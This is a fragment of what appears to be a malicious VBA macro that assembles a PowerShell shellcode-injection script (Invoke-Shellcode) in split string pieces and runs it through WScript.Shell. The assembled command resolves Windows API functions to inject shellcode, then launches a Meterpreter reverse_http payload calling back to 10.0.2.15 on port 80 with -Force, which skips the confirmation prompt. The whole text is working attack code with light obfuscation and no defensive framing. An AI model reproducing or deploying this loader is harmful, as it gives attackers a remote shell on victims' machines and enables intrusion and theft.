        FW = FW + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        FW = FW + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        FW = FW + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        FW = FW + "rocAddress kernel32.dll CreateThread
        $Crea"
        FW = FW + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        FW = FW + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        FW = FW + "IntPtr])
        $CreateThread = [System.Runtime.I"
        FW = FW + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        FW = FW + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        FW = FW + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        FW = FW + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        FW = FW + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        FW = FW + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        FW = FW + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        FW = FW + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        FW = FW + "ForSingleObjectDelegate)
        if ( $Force -or $"
        FW = FW + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        FW = FW + " your evil plans?',
                 "Injecting sh"
        FW = FW + "ellcode into the running PowerShell process!" ) )
"
        FW = FW + "        {
            Inject-LocalShellcode
      "
        FW = FW + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        FW = FW + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        FW = FW + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(FW)
End Function

